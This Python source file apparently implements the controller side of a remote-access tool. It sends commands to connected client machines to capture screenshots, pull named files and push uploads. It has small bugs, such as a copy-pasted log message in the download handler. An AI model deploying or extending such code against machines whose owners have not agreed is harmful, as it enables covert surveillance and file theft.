from __future__ import annotations

import os
import io
import socket
import json
import time
import utility

from . import session_manager as sm


class ClientSession:
    def __init__(self, *, conn: socket.socket, sid: int, manager: sm.SessionManager):
        self._conn = conn
        self._sid = sid
        self._manager = manager
        self._instructions = {
            "screenshot": self._screenshot,
            "download": self._download,
            "upload": self._upload,
        }

    # properties -------------------------------------------------------------

    @property
    def sid(self) -> int:
        return self._sid

    @property
    def conn(self) -> socket.socket:
        return self._conn

    # instruction handling ---------------------------------------------------

    def _screenshot(self) -> None:
        """Handles the request and aquisition of a screenshot from the client"""
        utility.Response.out(f"Requesting screenshot from session {self.sid}")
        self._send_command("screenshot")
        file_size = self._get_file_size()
        if file_size > -1:
            try:
                self._receive_file(
                    file_size,
                    utility.screenshot_dir(),
                    f"screenshot_{self.sid}_{int(time.time())}.png",
                )
            except Exception as e:
                print(e)
        else:
            utility.Response.err("Failed to recieve screenshot data")

    def _download(self, *args) -> None:
        """Download a file from the client"""
        if not args:
            return utility.Response.err("No file specified")
        file_path = " ".join(args)
        utility.Response.out(f"Requesting screenshot from session {self.sid}")
        self._send_command("download", file_path)
        file_size = self._get_file_size()
        if file_size > -1:
            self._receive_file(
                file_size, utility.download_dir(), os.path.basename(file_path)
            )
        else:
            utility.Response.err("Failed to recieve file data or file does not exist")

    def _upload(self, *args) -> None:
        """Upload a file to the client"""
        file_path, remote_path = " ".join(args).split(" < ")
        if not os.path.exists(file_path):
            utility.Response.err(f"File {file_path} does not exist")
            return
        self._send_command(
            "upload",
            os.path.basename(file_path),
            remote_path,
            os.path.getsize(file_path),
        )
        response = self._conn.recv(512).decode()
        if response == "OK":
            f = open(file_path, "rb")
            while True:
                data = f.read(1024)
                if not data:
                    break
                self._conn.sendall(data)
            utility.Response.out(f"Uploaded file {file_path} to {remote_path}")

    def execute(self, command: str, *args):
        """Fetch the relative function of the given command and execute it with the given arguments

        Args:
            command (str): [description]
        """

        func = self._instructions.get(command)
        if func is not None:
            func(*args)

    # socket interaction ----------------------------------------------------

    def _get_file_size(self):
        try:
            return int(self._conn.recv(512).decode())
        except (ValueError, TypeError) as e:
            return -1

    def _receive_file(self, file_size: int, save_dir: str, file_name: str) -> None:
        """Receive a file from the client

        Args:
            file_size (int): size of the file to be received
        """
        data = io.BytesIO()
        while True:
            buffer = self._conn.recv(1024)
            if not buffer:
                break
            data.write(buffer)
            print(f"Status: {data.tell()}/{file_size} Bytes", end="\r", flush=True)
            if data.tell() == file_size:
                break
        print("\n", end="\r")
        with open(
            os.path.join(save_dir, file_name),
            "wb",
        ) as file:
            file.write(data.getvalue())
            utility.Response.out(f"Saved file as {file_name}")

    def _send_file(self) -> None:
        """Send a file to the client"""
        pass

    def _send_command(self, command: str, *args) -> None:
        """Send a command packet to the client

        Args:
            command (str): command string to send over the socket connection
        """
        self._conn.send(json.dumps({"command": command, "args": args}).encode("utf-8"))
